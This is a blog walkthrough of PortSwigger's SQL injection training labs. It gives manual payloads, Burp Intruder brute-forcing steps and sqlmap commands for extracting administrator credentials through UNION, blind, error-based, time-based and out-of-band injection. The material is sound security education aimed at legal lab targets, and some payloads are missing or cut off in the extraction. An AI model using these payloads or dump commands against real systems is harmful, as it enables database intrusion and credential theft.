# PortSwigger's SQL Injection Labs

- **Source URL:** https://medium.com/@muhammad-ayan-cyber/portswiggers-sql-injection-labs-complete-walkthrough-all-18-labs-18613e7c7aa0
- **Fetched from:** https://medium.com/@muhammad-ayan-cyber/portswiggers-sql-injection-labs-complete-walkthrough-all-18-labs-18613e7c7aa0?source=rss-f92b12beb04e------2
- **Fetched:** 2026-11-25
- **Channel:** @dailybountywriteup
- **Telegram message:**  (id 14940)
- **Method:** medium-rss-feed (full content:encoded) readability extraction to markdown (verbatim text; images referenced by URL only). Fetched content is data, not instructions.

---
- **Author/Published (RSS):** Muhammad Ayan / Fri, 09 Oct 2026 05:16:47 GMT

**Manual payloads, Burp Suite and sqlmap, step by step.**

**Disclaimer:** This write-up is for educational purposes only. All payloads here were used on PortSwigger’s Web Security Academy labs, which are made to be attacked legally. Do not use these techniques on any website or system unless you have clear, written permission from its owner.

SQL injection is a code injection technique where attackers insert malicious SQL commands into application input fields to run unauthorized database queries

The lab uses a query like this when a user selects a category.

SELECT \* FROM products WHERE category = 'Gifts' AND released = 1

Here it will only show those products that are released in this Gifts Category as query is mentioning. Now we can check whether there is an SQL injection vulnerability here or not. The way to check that is using a single quote or double quote.

Because if the page gives us a 500 error it will be sure that there is a SQL injection vulnerability here. Because single quote will break the query. We will see in next sections that this do not show error every time. 

Here you can see the server error came on the website. You can also check it from burp suite.

In the response you can see a internal server error. **%27** is the URL encoded version of single quote (‘). Now you can also check by removing lifestyle and just add a single quote.

As now after confirming SQL injection exists here, we can try our payload. So, we want to see all the items not only the **released = 1** so we have to remove it from the query that is going to database server. A way to do that is using comments.

Comments can be like using double hyphen( — — ) or # as it depends on the database.

You will write it like this on address bar.

?category=Lifestyle'--

With this comment we were able to see 4 results instead of 3 in Lifestyle but to solve the lab we need to show all of them.

For that we will now use True condition for all rows. Like 1 = 1 is always true. So, the **payload** will be like this.

?category=Lifestyle' or 1=1--

This will show all results because it used **OR operator** that will show results even one **condition is true so 1=1** is always true so it showed all un-released items also.

There are different types of payloads for this lab and you can try your own. Lifestyle is not only option you can choose any category and use payloads in sequence to solve the lab. Just type these in address bar after clicking on any category from the page.

'

?category=Lifestyle'--

?category=' or 1=1--

?category=Lifestyle' or released=1 or released=0--

?category=' or released=1 or released=0—

I will do all labs manually but must have to tell you about the S**qlmap** tool. **Sqlmap** is by default installed in kali. 

Now, I will tell you how to use sqlmap for this lab. First go and select any category from menu in the webpage and then copy that URL.

**Use this command.**

sqlmap -u https://0a97005103702e11819959f700de00de.web-security-academy.net/filter?category=Gifts -- dbs -- delay=1

**u** is for **url, dbs** is to find if **any database exists** and **delay=1** is because if the application is restricted so it may block our ip address from brute forcing payloads so we will use a **delay of 1 second** in this case.

This command was able to find out the database name and in our case it was PostgreSQL and also showed us that available database is public. After finding that database is public we can use it in our command.

sqlmap -u https://0a97005103702e11819959f700de00de.web-security-academy.net/filter?category=Gifts -D public --tables --delay=1

**tables** are to **show all tables in this database -D public** is to tell that **database is public.**

Now this time it told us that it has one table named products. Then now its time to find out the columns in the table products.

sqlmap -u https://0a97005103702e11819959f700de00de.web-security-academy.net/filter?category=Gifts -D public -T products --columns --delay=1

This command showed 8 columns with names. Now try to use dump instead of columns to dump all products.

sqlmap -u https://0a97005103702e11819959f700de00de.web-security-academy.net/filter?category=Gifts -D public -T products --dump --delay=1

**It stored the dump at this location in kali Linux.**

**/home/kali/.local/share/sqlmap/output/0a97005103702e11819959f700de00de.web-security-academy.net/dump/public/** 

You can go there by cd and this path. A file named **products.csv** will have that dumped data.

**Congratulations you solved the first lab.**

In this lab we have a login page and we have to **login as an administrator.** First go to my account and try some random passwords. Now if you don’t get the password, we will have to look for the SQL injection vulnerability in it. As the login page will show us account only on correct password and username so we can **imagine that the query could be like this.**

SELECT \* FROM users WHERE username = ‘shoaib’ AND password = ‘p@ssword!@#’

Means there is an **AND** condition which will only let us login as administrator when we give both username and password correct. We have to try to remove the second part of query so it let us login as administrator without need to give correct password.

You may have figured it out from our previous lab where we used comments. We will try those here also to comment out the AND operator. Use it like this on login page as given in screenshot. Go to my account and write like this.

Also, you must have to write a random password because otherwise it will not login because it is required from client side as you can see in the inspect mode.

In username field: administrator'--

In password field: abcd**/\*You can write anything in password field\*/**

Congratulations you solved the lab.

Now, It’s time to do something interesting like **union operators.**

**Hint:** On Oracle databases, every **SELECT** statement must specify a table to select **FROM**. If your **UNION SELECT** attack does not query from a table, you will still need to include the **FROM** keyword followed by a valid table name. 

There is a**built-in table** on **Oracle** called **dual** which you can use for this purpose. For example: **UNION SELECT ‘abc’ FROM dual**

Now, check for the sql injection vulnerability with previous technique of single quote and comments and if you see errors on the page it means user can insert malicious commands.

After finding that the sql injection vulnerability sits here we have to find the version of oracle database here and for that you can look for cheat sheet on port swigger.

Use this payload in the address bar one-by-one. It actually orders the no. of column you enter so if 1 orders your output it means it ordered 1st column in you select statement. Do it till you get an error. If you got an error on 3 it means there are only 2 columns that are being retrieved.

'order by 1--

'order by 2--

'order by 3--

As we said, Order by 3 is returning error so it means only 2 columns are being retrieved.

As we said earlier that oracle need **from** with select every time otherwise it will not work even you don’t want to use from for a table but still it requires so you use **dual** table for that.

‘ union select null, null FROM dual--

Now, use the strings in the null.

‘ union select ‘asdf’, ‘fdsa’ FROM dual--

In cheat sheet of PortSwigger's labs you can find the statement to find version of oracle.

SELECT banner FROM v$version

Here, we want to show the version also the supporting software in one place so we use **v$version** and banner here is actually finding the version number also we use banner grabbing in **netcat** like **nc 127.0.0.1 22** this will show output of ssh version we are running on kali.

Use this statement given in cheat sheet as a payload in your request like this.

' union select banner, 'asdf' from v$version--

And, you will be seeing all versions and supporting software versions on lab also your lab must be solved.

'order by 3--

' union select null, null FROM dual--

' union select 'asdf', 'fdsa' FROM dual--

' union select banner, 'asdf' from v$version--

Previously, we found the version for oracle but this time it is MySQL and Microsoft which is slightly easy as here there is no condition like using **from** with **select**. You can simply use ‘ union select null, null — — without any table name required.

To solve this lab head over to cheat sheet on PortSwigger's. We first have to find number of columns that can retrieve text in them. As, I said that from is not required with select but this time comment are not only two hyphens. This time it is like this.

-- - /\*The space between them is required\*/

Now, use the order by payload to find no of columns. You can use it like this. Every payload you will write is between the comments and the single quote.

‘order by 3-- -

If it shows error then there are only 2 columns retrieved. It’s time to find that which columns can accept text.

' union select 'asdf','jkll'-- -

Now after seeing these two strings in output we can use one of these two for retrieving the version of database. Now payload for finding the version of my sql is different so we will use this one. You can find this in portswigger cheat sheet.

' union select @@version,'jkll'-- -

This payload gave us the output that was required.

-- -

'order by 3-- -

' union select 'asdf','jkll'-- -

' union select @@version,'jkll'-- -

First find how many columns are here by using the order by payload we discussed earlier. After we have found that there are 2 columns here go find that which columns can accept text in them. Use this payload to find which columns accept text.

‘UNION SELECT ‘asdf’, ‘jkll’--

You will see asdf and jkll in the output on page. After, finding that both columns accept text you can use any of them. As, we are told that this is non-oracle so skip the oracle payload use the other 2 payloads in cheat sheet one-by-one.

‘UNION SELECT ‘asdf’, version()--

‘UNION SELECT ‘asdf’, @@version--

**version()** confirms that this is a PostgreSQL database. 

Now, head over to cheatsheet and go in database content section and use the PostgreSQL.

SELECT \* FROM information\_schema.tables /\*This is for PostgreSQL\*/

The information schema is the meta data of the database. You can see the official documentation for the table name that you would like to retrieve from PostgreSQL. In our case we cannot use the \* because (\*) means all columns but we can only retrieve 2 columns. 

Use this payload:

‘union select table\_name,’asdf’ from information\_schema.tables--

Now you will get a bunch of table names and the required one for us is this. **users\_atojka /\***It can be different in your scenario**\*/**Now we need to find columns from this table. For that we have the table name now so we can use the second payload in the cheat sheet.

‘union select column\_name,’asdf’ from information\_schema.columns where table\_name=users\_atojka--

Now, we are seeing different columns but our required one’s are these. 

**username\_rhpqdp password\_drzdym**

We got all the information required to solve this lab. Next payload is simple.

‘ union select username\_rhpqdp, password\_drzdym from users\_atojka--

Now, here you go. We got all the passwords also the administrator password.

Now, click my account on the web page and use the name and password of administrator to login.

‘UNION SELECT ‘asdf’, ‘jkll’--

'UNION SELECT 'asdf', version()--

'union select table\_name,'asdf' from information\_schema.tables--

'union select column\_name,'asdf' from information\_schema.columns where table\_name=users\_atojka--

'union select username\_rhpqdp, password\_drzdym from users\_atojka--

For this lab first find how many columns are being retrieved. You can use order by statement by seeing the payloads in lab 4. There are 2 columns being retrieved. Now, use this payload to find that how many columns accept text.

‘ union select ‘asdf’,’fdsa’ from dual--

Go to official documentation of oracle and you will see a section of **ALL\_TABLES** which retrieves all the meta data of the existing tables in the database. Use this payload to find tables names of the all\_tables which is actually like a schema.

‘ union select table\_name,’asdf’ from all\_tables--

All table names will be shown but the one that is useful for us is this. 

**USERS\_JAAKTM**

After this we have to find columns in this table name so go to cheat sheet and see the payloads. As you cannot select \* instead you need to go to the official documentation of oracle again and go to column section where you will see name of column which is **column\_name** and this time it will not be **all\_tables** it will be **all\_tab\_columns** because you want to see columns.

‘ union select column\_name,null from all\_tab\_columns where table\_name=’ USERS\_JAAKTM--

We retrieved all columns but the one’s we want are these. 

**PASSWORD\_JWCFDO USERNAME\_VAXKJV**

After, finding all information we can use this payload to find all usernames and passwords.

‘ union select USERNAME\_VAXKJV, PASSWORD\_JWCFDO from  USERS\_JAAKTM--

Here you go with all passwords.

Go login as administrator with the username and password.

‘ union select ‘asdf’,’fdsa’ from dual--

' union select table\_name,'asdf' from all\_tables--

' union select column\_name,null from all\_tab\_columns where table\_name=' USERS\_JAAKTM--

' union select USERNAME\_VAXKJV, PASSWORD\_JWCFDO from USERS\_JAAKTM--

There are many categories of the products that are showing on the web page. So, we can consider this query is being used to fetch data from server.

SELECT \* FROM products WHERE category = ‘Gifts’

Now, Find number of columns being retrieved. We have 2 ways for that.

SELECT \* FROM products WHERE category = ‘Gifts’ ORDER BY 1--'

2\. **Operator: UNION** This is the second way to find no of columns. Payload is like this.

‘UNION SELECT NULL—

‘UNION SELECT NULL, NULL--

‘UNION SELECT NULL, NULL, NULL--

Difference between **ORDER BY and UNION:**

**ORDER BY 1 throws an error** when the number you input is **greater than the total number of columns** in the original query (e.g., typing ORDER BY 5 when the table only has 4 columns).

**UNION SELECT NULL throws an error** when the number of NULL values you provide **does not exactly match** the number of columns in the original query, or if the column data types conflict on certain databases.

In this lab there were 3 columns so the 3 nulls worked and solved the lab.

'ORDER BY 3--

'UNION SELECT NULL, NULL, NULL--

It is similar to the previous labs. Like other labs we also have category filters here. Query for server side may look like this.

But we first have to find the number of columns so we will use **ORDER BY.**

'ORDER BY 4 --

As order by 4 gave an internal server error so one thing is confirmed that it has 3 columns. Means the query of sql is not returning \* it is returning 3 columns. Same like previous lab. 

You can also use the union operator for payload.

‘UNION SELECT NULL, NULL, NULL--

This showed same result as there are 3 columns. So, as we use NULL values we get return all null values. As you can see in the screenshot attached below.

What if now try to use a text inside these instead of null. We can try these payloads. If the payload matches the text column it will show otherwise an error will occur. As to solve the lab use the string text given by lab.

‘UNION SELECT ‘8UZ7Rl’, NULL, NULL--

‘UNION SELECT NULL, ‘8UZ7Rl’, NULL--

‘UNION SELECT NULL, NULL, ‘8UZ7Rl’--

Testing all these shows that the second column is the text column which means only one column is accepting text. It also solved the lab.

'ORDER BY 4 --

'UNION SELECT NULL, NULL, NULL--

'UNION SELECT NULL, '8UZ7Rl', NULL--

Previously you use the same type of queries of sql but here where users table is in a different database. You need to use something called **FQN (Fully Qualified Names).**

FQN look something like this below.

SalesDB.dbo.Customers.CustomerID

Now, again in this lab we have to find number of columns that are being retrieved. Use order by again like previously and see that there are 2 columns also with union select we saw that they are text.

‘order by 3--

‘UNION SELECT ‘asdf’, ‘jkll--

Now, retrieve usernames and passwords from users table.

' union select username, password from users--

We got the usernames and passwords.

Enter the **administrator as username** and password that is given to login and solve your lab.

'order by 3--

'UNION SELECT 'asdf', 'jkll--

'union select username, password from users--

Sometimes you can’t get both columns on same time so you need to get multiple values in a single column. As here are we seeing product names and id’s so query can be like this.

SELECT id, name from products WHERE category=’Pets’

Again, use the single quote to disturb it and check is it vulnerable and sure it is. Now to check how many columns are being returned so use order by payloads and you will see it crashes on 3 and it means there are only 2 columns being returned. There could be more columns but only 2 are being returned. Now use **union** attack to check which column has text in it.

‘ union select null, null--

You will see a new row at the page but it will be empty as we gave null. So go give text to check that which column has text value. Like second one has.

‘ union select null,’asdf’--

Now usually we **use ‘union select username, password from users —** but here as we already saw that first column is not returning anything on text so we have to use second column two time like this.

' union select NULL, username from users--

Here you saw we get all usernames in 1 column so now we will next try to find out all passwords in that.

Now, for passwords.

' union select NULL, password from users--

This time we got all passwords also the administrator one. So here we only have one column that can return text value so we used it to get these data one-by-one.

Now here you might thing that the first one is the admin password but not the administrator password was the second one so you have to try all of those to check which one. This worked but what if data is too much big then you have to use concatenation to get both in one column. So, you don’t get confuse. For that you have to see that which version of the database software it is using.

You can see the cheat sheet of the port swigger. To check my sql and Microsoft version use **@@ version**. For other’s you can check cheat sheet.

' union select NULL, @@version--

It gave an internal server error so it meant it is not my sql and Microsoft so try to use the other one. The one for PostgreSQL and it is actually PostgreSQL.

' union select NULL, version()--

As we have to use the string concatenation we wanted the version so now we have to use the **PostgreSQL syntax for concatenation**. You can look for that in the cheat sheet of port swigger.

This is the payload.

' union select NULL, ‘foo’||’bar’ from users--

As the cheat sheet has shown concatenation of two but we can add three so we can make the middle one like a space or a colon : so we differ from the name and password. Also, remember not to use single quote for username and password otherwise it will return these words not values of them in users table.

' union select NULL, username||':'||password from users--

We got the exact passwords of the usernames.

Go to my account on lab and paste the administrator usrname and his password to login as administrator and solve the lab.

' union select null, null--

' union select null,'asdf'--

' union select NULL, username from users--

' union select NULL, password from users--

' union select NULL, version()--

' union select NULL, 'foo'||'bar' from users--

' union select NULL, username||':'||password from users--

To solve these blind labs you have to write the payload inside the tracking id before the semicolon. Also use a tool like burp to send a request and capture it. You can use any other if you like too.

Now, the lab will not give error on response as this time the sql query is happening within a cookie. The cookie interacts with the database. We have to attack the value of cookie to get the password of the administrator. Now access the lab and you will see this interface.

Open burp suite and you will see that we are given a tracking id and session cookie. And these cookies will be stored in our browser.

Now, if you reload this page again. You can see a welcome back message this time.

This is because the cookies are stored in our browser and this time when we reloaded the page it sends the tracking id cookie to server with our request.

You can see here that this time tracking id and session cookies were also send to server with our home page request.

The tracking id is being tracked so whenever a user sends a request using a tracking cookie it will detect the session and will give a welcome back message.

Now, it’s time to send that request to repeater to test somethings. Select that and send to repeater. Value of the tracking cookie must be a part of some sql query because with this we see welcome message. The server is able to track us with this.

We can guess that there could be a table named **Tracking** and query could be like this.

SELECT TrackingID from Tracking where TrackingID=’ blq9BHsIPiNDIHx8’ and session=’ hvZTVDchdQO2B75gl0UH7KAgFLHjTv’

Now add a single quote at the end of tracking id and it showed no welcome back message and when add a single quote and two hyphens then it showed welcome back message which means query could be like this. So, correct query must be like this.

SELECT TrackingID from Tracking where session=’hvZTVDchdQO2B75gl0UH7KAgFLHjTv’and TrackingID=’blq9BHsIPiNDIHx8’

Because if the previous would have been the case, then the session could have been commented out but now only **‘** is commented out.

Now, you will only get a welcome back message if the racking id is correct. If you change it a little and try it will not show you a welcome message also not give you a new tracking cookie. Means a true condition will give a positive response and a false condition will give a negative response. As the tracking id is giving 200 status code on both with single quote and without but welcome back message is only shown without single quote in tracking cookie. And shows when single quote and two hyphens are there.

Now, write **‘ or 1=1** in the tracking id like this.

Cookie: TrackingId=Xz8JxrhQ7A3P8mJh'or 1=1--; session=l68gTiaRXIDhsCNA9gdAS5mDV9WkL4RM

**Or 1=2** will also show welcome back message because one condition on left side is true.

Cookie: TrackingId=Xz8JxrhQ7A3P8mJh'or 1=2--; session=l68gTiaRXIDhsCNA9gdAS5mDV9WkL4RM

Now, there is a point. What if we remove the last digit of tracking id and make the other condition also false like 1=2. So, this gave no welcome back message but when we try same with 1=1 as you know now tracking id is not correct but the second condition is correct so or will give welcome back message. So only you have to do is that to make the condition true and cookie false and it will work.

Now, it’s time for **AND statement**. Use one-by-one.

Cookie: TrackingId=Xz8JxrhQ7A3P8mJh'and 1=1--; session=l68gTiaRXIDhsCNA9gdAS5mDV9WkL4RM

Cookie: TrackingId=Xz8JxrhQ7A3P8mJh'and 1=2--; session=l68gTiaRXIDhsCNA9gdAS5mDV9WkL4RM

So now make the tracking id correct again also second condition should also be true and it showed the welcome back message. So, if tracking cookies is correct then 1=1 will show welcome back message and 1=2 will not because and works only when both are true.

Now again make the tracking id last character to remove and make the second condition 1=1 and use or operator.

Like 1=1 we can also use ‘asdf’=’asdf’ which is also true. We will use it in our payload.

Actually, we select some string like asdf which matches the string that is equal to like asdf.

'or (select 'asdf' from users where username='administrator')='asdf'--

And you will see a welcome back message. Now try to make the =asdf to =fdsa means false.

'or (select 'asdf' from users where username='administrator')=’fdsa’--

And this time you did not got a welcome back message. So, make it again to asdf for true. Now to find the password we need to find how many characters is the password.

For that we will try this payload.

'or (select 'asdf' from users where username='administrator' and length(password)>1)='asdf'--

Actually, if the password is greater than 1 it means the left condition is true and we will get a welcome back message. And we saw a welcome message. Do it till you find length of password. Or try the = statement like below.

'or (select 'asdf' from users where username='administrator' and length(password)=1)='asdf'--

And no welcome message means it is not 1 character so we will use intruder to automate this task.

Now select 1 and send it to intruder by right clicking and it will add it to the payloads.

**Like this:**

Now, select numbers form the payloads.

**Set range from 1 to 25**

Now what are we look for we are looking for welcome message.

Copy that from the home page from repeater.

**Welcome back!**Copy this and go to intruder. Now go to settings on left side and go to Grep Match and paste the message that you want. First clear all things then paste it.

Now click on the welcome bank button on the bar 2 times and you will see this.

Now we got the password length is 20. For finding the password now go to the cheat sheet and you will see this substring payloads

**SUBSTRING(‘foobar’, 4, 2)**

we will be using this. Now, if we say it like this.

**SUBSTRING(‘a, 1, 1)**

So, it means that you are selecting a substring start with the first position and the number of positions from the first position. And it will return a single character.

Now go to repeater and use this payload.

`'or (select SUBSTRING('a', 1, 1) FROM users WHERE username='administrator')='a'--`
And it will show a welcome back message. As it matched a but we want to find password so do this and it will match each character with the where clause that is administrator and will show all characters of passwords that match the administrator password.

'or (select SUBSTRING(password, 1, 1) FROM users WHERE username='administrator')='a'--

Means here it will try to match fist character of password if it is a or not and will show and in the below one it will see the second character is a or not.

`'or (select SUBSTRING('a', 2, 1) FROM users WHERE username='administrator')='a'--`
Like here you can also see we can try for other characters like if b is the second character or not.

`'or (select SUBSTRING('a', 2, 1) FROM users WHERE username='administrator')='b'--`
Now send it to intruder so we brute force the password character from 1 to 20 in the substring as there are 20 characters in password and the characters at the end where b is written.

So, select one like this.

And other like this. Also change the attack to cluster bomb attack. Cluster bomb is because you are using two payloads.

Now choose the first one for number and second one for brute force and set like this.

Now again go to settings and paste the **Welcome back!** Message in the grep match.

Now start attack. Now, click the welcome back message two times here and you will see all password characters with that also you will see on which number which character is.

Now to easily find the password from these just highlight all the welcome back message.

Apply filter of only showing the highlighted ones.

Click on the payload 1 and you will see sequence of password characters and in payload 2 you have your password characters.

**Password: pincur9bjeggi0f043jp**

Now login to administrator with this password and you are done.

You can look cheat sheet whenever you want. This one is also some similar to the previous one. Means when you will first time access the lab a session and tracking id cookie will be saved in your browser. On reloading you will be sending those cookies from user side. But like previous we do not have a welcome message so we have to depend on error messages. For it we have to cause an error. So, write a single quote in the tracking id and it will cause an internal server error and when you will use single quote with comments it will be again fine.

As we are in oracle so go to cheat sheet. For concatenation in oracle the syntax is like this.

**‘foo’||’bar’**

To make it like a payload use this

‘paste\_tracking\_id\_here’|| (select null from dual)--

You can also use **users** instead of dual.

‘paste\_tracking\_id\_here’|| (select null from users)--

And the users table payload will give an error. As it is because users table has multiple rows and dual has only one row. And here the request is for only a single output TrackingID. So now try this payload.

‘paste\_tracking\_id\_here’|| (select null from users where username=’administrator’)--

And this will not cause the error as we only requested a single row. So, we got 2 conditions from here that if.

**False = error**

**True + single row = okay**

**True + multiple row = error.**

Means it only will not return error if condition is true and for a single row.

Now, if you go to cheat sheet you have conditional errors payloads.

Choose the one that is for oracle.

**SELECT CASE WHEN (YOUR-CONDITION-HERE) THEN TO CHAR(1/0) ELSE NULL END FROM dual**

Here case is like an if statement means if condition is true like 1=1 it will crash otherwise it will show you something positive.

Use it like this.

‘|| (SELECT CASE WHEN (1=2) THEN TO\_CHAR(1/0) ELSE NULL END FROM dual)--

So, as you can see 1=2 is not true so it will not crash and will return no error. Now, to use these for finding the password we first have to find length of the password. Use this payload to find the length of password.

'||(select case when (length(password)>1) THEN TO CHAR(1/0) ELSE NULL END FROM users where username='administrator')--

And it showed error means password is greater than 1. And now if you try to equal to 1 it will give no error means password is not 1 character.

'||(select case when (length(password)=1) THEN TO CHAR(1/0) ELSE NULL END FROM users where username='administrator')--

So, now bruteforce it the same way you did before. Select 1 and send to intruder and set range of payload from 1 to 25.

And start attack and because it will give error when so you will see a 500-error code for the correct no of passwords characters.

In our case it is 20. Now, in cheat sheet go to substrings and choose this one.

**SUBSTR(‘foobar’, 4, 2)**

We will use this in our way. Let me first explain it to you.

**SUBSTR(‘foobar’, 1, 1)** this means if foobar is the password then it will start returning first character and only one character which means **f** will be returned.

**SUBSTR(‘foobar’, 1, 3)** this will return **foo.**

**SUBSTR(‘foobar’, 3, 2)** this means that from third character I want 2 characters means **ob** will be our output.

**This is the one we will use.**

**SUBSTR(password, 1, 1)=’y’**

'||(select case when SUBSTR(password, 1, 1)=’y’ THEN TO CHAR(1/0) ELSE NULL END FROM users where username='administrator')--

Now send this request to intruder so we can bruteforce it. Select cluster Bomb and select 1 and y as payloads. And apply same condition like before in payloads.

Now just look for the 500 codes and those are your password characters. You can arrange same way by using previous lab trick.

You got your password. Sign in as administrator and you are now done.

Capture the request and send to repeater. Remove the session and tracking id just leave one character in tracking and add a ‘ there and you will see error and add a — and it will be fine. Then use this payload in tracking id. This payload is provided by the port swigger you can check there.

' AND CAST((SELECT username FROM users) AS int)--

But the above one will throw an error saying after and there should be a Boolean type so just use this.

' AND 1=CAST((SELECT username FROM users) AS int)--

Now this error will come.

Means multiple rows are being returned and our query only expects one row.

So, now try this one.

' AND 1=CAST((SELECT username FROM users LIMIT 1) AS int)--

Now it is saying that your type is wrong. And this error gave us good thing. It told us in error that the first row in users table is administrator.

Same in the below payload. It gave us error of type but accidently gave us password.

' AND 1=CAST((SELECT password FROM users LIMIT 1) AS int)--

As, you can see:

Now, login with these credentials.

Go capture the request and send it to repeater. Remove the session cookie and tracking id and only leave one character in tracking id. Again, do the single quote and comment out things. You will not see an error on screen with single quote as it is a blind sql injection so your task is to make 10 seconds delay.

Go to cheat sheet and in time delays section to see the payload.

As this is PostgreSQL so use this payload.

'||pg\_sleep(10)--

Now wait 10 seconds and you will see it is solved.

This is also an interesting lab. Access the lab and capture the request and send it to repeater. So, the simple single quote or the comments will not return any useful thing or error. So first try all time-based payloads form the cheat sheet. And this one delayed in our case.

Cookie: TrackingId=HNQs7TQ6S7KtZlc4'|| pg\_sleep(10)--

Which means it’s a PostgreSQL. Now use the conditional time delay payload of PostgreSQL. It is the one in cheat sheet. Customize it accordingly.

SELECT CASE WHEN (YOUR-CONDITION-HERE) THEN pg\_sleep(10) ELSE pg\_sleep(0) END

Encode the semicolon by ctrl u before using.

TrackingId=HNQs7TQ6S7KtZlc4';select case when(1=1) then pg\_sleep(10) else pg\_sleep(0) end--

Here we used semicolon to make these statements to two.

TrackingId=HNQs7TQ6S7KtZlc4'%3bselect case when(username='administrator') then pg\_sleep(5) else pg\_sleep(0) end from users--

This one worked and now we have to find length of password. Now, use this payload for password length finding.

TrackingId=HNQs7TQ6S7KtZlc4'%3bselect case when(username='administrator' and length(password)=20) then pg\_sleep(5) else pg\_sleep(0) end from users--

You can also use intruder to brute force but by doing so much labs we have a hint so we just tried 20 and there are 20 characters.

Now, we have to find all characters of password so go to substring payload in cheat sheet. Use the PostgreSQL substring.

Now, use this in repeater and then send to intruder for brute forcing.

TrackingId=HNQs7TQ6S7KtZlc4'%3bselect case when(username='administrator' and SUBSTRING(password, 1,1)='a') then pg\_sleep(5) else pg\_sleep(0) end from users--

Now you know just set 1 to numbers and a to bruteforcing payloads. Use the older tricks now to sequence the password.

You got the password.

Password: 5jq8zm22urd0640bl73c

Login with this password and solve the lab.

So, now it’s time for this. Just go to dns lookup section in the cheat sheet and see out of band. To do this legally use burp collaborator not your own remote server.

So, now again open the lab and capture request by reloading it and then send that to repeater.

This one is very secure so not single quote or comments will work here so we have to go out of band. Now go to burp and go to collaborator and start and copy so you can paste that url in the payload in dns payload sections.

It looks like this. Copy it from cheat sheet on portswigger academy. Just change the BURP-Collaborator-Subdomain with the link in collaborator.

After you get a response of web page to to collaborator and click poll now.

We are almost near to solve all sql injection labs. Just like the previous one and you have command for it in cheat sheet so just enhance it like this. First go and open lab and reload and capture that request and send to repeater.

Just Use this payload and like previous just enter the burp collaborator domain by right clicking.

Add that domain after starting collaborator. And make your cursor there where you want to paste the domain.

**Payload is this.**

After you get a response of web page to collaborator and click poll now.

Here you will see your password in collaborator on clicking a dns.

Password: 0chuxl5q28ocnvcegvot

This lab contains a SQL injection vulnerability in its stock check feature. The results from the query are returned in the application’s response, so you can use a UNION attack to retrieve data from other tables.

The database contains a users table, which contains the usernames and passwords of registered users. To solve the lab, perform a SQL injection attack to retrieve the admin user’s credentials, then log in to their account.

Now access the lab and go to one of the products. Click the check stock as they said vulnerability exist there and then go to burp and capture request and send it to repeater.

We want to see now that do we have a point of injection here.Try to add 1 in store id. As, we want to check is this get processed in backend that we wrote.

After this you can see that in response we got a different no of units. Now us this.

UNION SELECT NULL

And you can see we got error so in lab we were told we can use xml encoding so try that.

You can use this to do xml encoding and it will bypass waf.

Else just try any online tool to convert to xml. Now use like this.

**Not encoded:**

**Encoded:**

UNION SELECT NULL

**And here is the response.**

But when we use two nulls and it gives 0 units mean app is broken. So, it means only one column is being retrieved.

Now you can get username and password one at a time so do this.

**Payloads:**Use the encoded versions.

UNION SELECT username from users

UNION SELECT username from users

UNION SELECT password from users

UNION SELECT password f&#

Now after running these payloads you have got the username and password so just login.

*Congratulations! You made it to the end, If you have any feedback or questions, drop them in the comments below. Follow me and stay connected, because the next article covers the XSS labs.*
